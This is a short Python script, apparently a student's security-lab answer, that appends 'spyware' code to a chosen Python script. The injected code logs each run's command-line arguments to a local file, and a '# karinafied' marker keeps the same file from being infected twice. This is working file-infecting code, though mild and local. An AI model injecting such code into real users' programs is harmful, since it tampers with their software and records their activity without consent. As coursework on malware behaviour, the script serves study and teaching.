import os
import sys

DIRECTORY = '/home/cse/Lab2/Solutions'
INFECTED = '# karinafied'


def script(f): # checks if python file is a script
  with open(f, 'r') as file:
    content = file.read()
    return "if __name__ == '__main__':" in content or 'if __name__ == "__main__":' in content


def infected(f): # checks if file is infected (contains virus code)
  with open(f, 'r') as file:
    content = file.read()
    return INFECTED in content
    
    
def spyware(f): # writes spy code into file
  with open(f, 'a') as file:
    file.write('\n\n')
    file.write("  # karinafied\n")
    file.write("  import sys\n")
    file.write("  command_line = ' '.join(sys.argv)\n")
    file.write("  with open('Q1B.out', 'a') as output_file:\n")
    file.write("    output_file.write(command_line + '\\n')")
    
    
def main(): # does the spy stuff
  if len(sys.argv) != 2:
    print("format: python3 Q1B.py <file.py>")
    sys.exit(1)
  
  f = sys.argv[1]
  
  if not os.path.exists(f):
    print(f"File '{f}' does not exist.")
    sys.exit(1)
  
  if not script(f):
    print(f"'{f}' is not a script")
    sys.exit(1)
  
  if infected(f):
    print(f"'{f}' is already infected")
    sys.exit(1)

  spyware(f)
  print(f"spyware successfully injected into '{f}'")


if __name__ == "__main__":
  main()